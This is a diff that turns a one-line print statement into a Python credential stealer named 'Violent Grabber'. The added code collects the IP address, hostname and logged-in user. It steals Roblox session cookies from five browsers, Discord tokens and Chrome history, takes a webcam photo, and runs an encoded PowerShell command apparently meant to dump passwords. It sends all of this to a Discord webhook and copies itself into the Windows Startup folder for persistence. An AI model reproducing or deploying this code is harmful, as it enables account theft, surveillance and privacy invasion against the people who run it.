@@ -1,1 +1,231 @@
-print("ham usl loaded")
+webhookz = "%DUDE%"
+import nextcord
+import platform
+import requests
+import subprocess #line:11
+# Create a Nextcord webhook object
+import re
+import aiohttp
+import asyncio
+import time
+
+import requests
+import subprocess
+import  platform ,asyncio ,tempfile ,os ,pathlib ,cv2 ,aiohttp ,win10toast ,re ,subprocess #line:1
+
+
+
+import requests #line:4
+import requests #line:5
+import os #line:6
+import platform #line:7
+import os #line:8
+import requests #line:9
+import pyscreenshot #line:10
+import subprocess #line:11
+webhook_url = webhookz
+webhook = nextcord.SyncWebhook.from_url(webhook_url)
+import subprocess
+response = requests.get('https://api.ipify.org')
+ip = response.text
+import os
+def shell(command):
+    output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    global status
+    status = "ok"
+    return output.stdout.decode('CP437').strip()
+async def send_subprocess(ctx, command):
+    proc = await asyncio.subprocess.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=subprocess.STDOUT)
+    stdout = (await proc.communicate())[0]
+    await save_out(webhook, stdout.decode(errors="ignore"))
+async def save_out(webhook, text):
+    filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".txt"
+    file = open(filename, "w+", newline="", encoding="utf-8")
+    file.write(text)
+    file.close()
+    await webhook.send(file=nextcord.File(filename))
+    os.remove(filename)
+def grab_tokens(path):
+    path += "\\Local Storage\\leveldb"
+    tokens = []
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+# Create an embed object
+embed = nextcord.Embed(
+    title="Violent Grabber",
+    description=",",
+    color=0xff0000 # Set the color of the embed (red in this case)
+)
+# Send the embed with the webhook
+name = platform.node()
+embed.add_field(name="Pc name:", value=name)
+embed.add_field(name="Bits", value=platform.architecture(1))
+embed.add_field(name="Ip:", value=ip)
+embed.add_field(name="Logged in User", value=f"**{subprocess.check_output('whoami').decode().strip()}**")
+
+webhook.send("@everyone")
+webhook.send(embed=embed)
+embed = nextcord.Embed(
+    title="Violent Grabber",
+    description="Roblox cookies.",
+    color=0xff0000 # Set the color of the embed (red in this case)
+)
+# Send the embed with the webhook
+
+import browser_cookie3
+
+try:
+    cookies = browser_cookie3.edge(domain_name='roblox.com')
+    cookies = str(cookies)
+    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    embed.add_field(name="Edge:", value=cookie)
+except:
+    pass
+
+try:
+    cookies = browser_cookie3.chrome(domain_name='roblox.com')
+    cookies = str(cookies)
+    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    embed.add_field(name="Chrome:", value=cookie)
+
+except:
+    pass
+
+try:
+    cookies = browser_cookie3.firefox(domain_name='roblox.com')
+    cookies = str(cookies)
+    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    embed.add_field(name="Firefox:", value=cookie)
+except:
+    pass
+
+try:
+    cookies = browser_cookie3.opera(domain_name='roblox.com')
+    cookies = str(cookies)
+    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    embed.add_field(name="opera:", value=cookie)
+except:
+    pass
+
+try:
+    cookies = browser_cookie3.brave(domain_name='roblox.com')
+    cookies = str(cookies)
+    cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    embed.add_field(name="Brave:", value=cookie)
+except:
+    pass
+webhook.send(embed=embed)
+import browser_cookie3
+
+webhook.send(embed=embed)
+embed = nextcord.Embed(
+    title="Violent Grabber",
+    description="Discord Tokens.",
+    color=0xff0000 # Set the color of the embed (red in this case)
+)
+msg = ""
+
+local = os.getenv("LOCALAPPDATA")
+roaming = os.getenv("APPDATA")
+paths = {
+    "Discord": roaming + "\\Discord", "Discord Canary": roaming + "\\discordcanary",
+    "Discord PTB": roaming + "\\discordptb", "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
+    "Opera": roaming + "\\Opera Software\\Opera Stable",
+    "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+for platform, path in paths.items():
+    if not os.path.exists(path):
+        continue
+    msg += f"\n{platform}:\n\n"
+    tokens = grab_tokens(path)
+    if len(tokens) > 0:
+        for token in tokens:
+            msg += f"{token}\n"
+    else:
+        msg += "Violent has found no tokens."
+if msg[0] == "\n":
+    msg = msg[1:]
+embed.add_field(name="Discord tokens: ", value=msg)
+embed.set_image("https://cdn.discordapp.com/attachments/1088759733378371635/1093940553751732224/211176071-8a9022fc-ce6a-4543-ae5d-87108fa9593c-1.gif")
+webhook.send(embed=embed)
+import sqlite3
+import os
+import time
+import shutil
+
+temp = (os.getenv('TEMP'))
+Username = (os.getenv('USERNAME'))
+shutil.rmtree(temp + r"\history12", ignore_errors=True)
+os.mkdir(temp + r"\history12")
+path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
+path_new = temp + r"\history12"
+copy_me_to_here = (("copy" + path_org + "\"{}\"").format(path_new))
+os.system(copy_me_to_here)
+con = sqlite3.connect(path_new + r"\history")
+cursor = con.cursor()
+cursor.execute("SELECT url FROM urls")
+urls = cursor.fetchall()
+for x in urls:
+    done = ("".join(x))
+    f4 = open(temp + r"\history12" + r"\history.txt", 'a')
+    f4.write(str(done))
+    f4.write(str("\n"))
+    f4.close()
+con.close()
+file = nextcord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
+webhook.send(file=file)
+
+
+
+import os
+import time
+import cv2
+temp = (os.getenv('TEMP'))
+camera_port = 0
+camera = cv2.VideoCapture(camera_port)
+#time.sleep(0.1)
+return_value, image = camera.read()
+cv2.imwrite(temp + r"\temp.png", image)
+del(camera)
+file = nextcord.File(temp + r"\temp.png", filename="temp.png")
+webhook.send("Pic:", file=file)
+
+passwords = shell(
+    "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
+f4 = open(temp + r"\passwords.txt", 'w')
+f4.write(str(passwords))
+f4.close()
+file = nextcord.File(temp + r"\passwords.txt", filename="passwords.txt")
+webhook.send(file=file)
+import os
+import shutil
+import getpass
+import sys
+
+username = getpass.getuser()
+
+# Get the path to the Startup folder
+startup_folder = os.path.join('C:\\', 'Users', username, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+if getattr(sys, 'frozen', False):
+    # If the script is compiled with PyInstaller, use the _MEIPASS variable to get the executable's path
+    script_path = os.path.join(sys._MEIPASS, os.path.basename(sys.argv[0]))
+else:
+    # If the script is running in a regular Python environment, use the script's path
+    script_path = os.path.abspath(__file__)
+
+# Check if the script is already in the Startup folder
+startup_script = os.path.join(startup_folder, os.path.basename(script_path))
+if os.path.exists(startup_script):
+    print("e")
+else:
+    # Copy the script to the Startup folder
+    shutil.copy(script_path, startup_folder)
+    
